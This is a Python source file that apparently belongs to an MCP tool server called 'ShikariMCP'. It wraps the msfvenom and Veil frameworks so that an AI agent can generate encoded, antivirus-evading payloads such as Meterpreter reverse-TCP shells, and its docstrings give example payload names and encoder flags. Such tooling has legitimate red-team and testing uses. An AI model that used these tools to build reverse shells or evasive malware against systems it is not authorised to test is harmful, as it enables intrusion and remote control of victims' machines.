# ShikariMCP — Evasion & Payload Generation

import shlex
from shikari.tools._base import shikari_tool, ToolScope
from shikari.core.executor import execute_command

@shikari_tool(
    name="msfvenom_generate",
    category="evasion_payloads",
    scope=ToolScope.LOCAL,
    binary="msfvenom",
    description="Payload generator and encoder from Metasploit."
)
async def msfvenom_generate(payload: str, output_path: str, format_type: str = "exe", extra_args: str = "") -> str:
    """
    Run MSFVenom.
    
    Args:
        payload: Metasploit payload (e.g., 'windows/meterpreter/reverse_tcp')
        output_path: Where to save the payload
        format_type: Output format ('exe', 'elf', 'py', 'raw')
        extra_args: Additional flags like 'LHOST=10.0.0.1 LPORT=4444' or '-e x86/shikata_ga_nai'
    """
    cmd = ["msfvenom", "-p", payload, "-f", format_type, "-o", output_path]
    if extra_args:
        cmd.extend(shlex.split(extra_args))
    result = await execute_command(cmd, timeout=300)
    return result.output

@shikari_tool(
    name="veil_generate",
    category="evasion_payloads",
    scope=ToolScope.LOCAL,
    binary="veil",
    description="Generate antivirus-evading payloads."
)
async def veil_generate(extra_args: str = "") -> str:
    """
    Run Veil framework execution flags.
    
    Args:
        extra_args: Veil flags (e.g., '-t Evasion -p go/meterpreter/rev_tcp -c LHOST=...')
    """
    cmd = ["veil"]
    if extra_args:
        cmd.extend(shlex.split(extra_args))
    result = await execute_command(cmd, timeout=300)
    return result.output
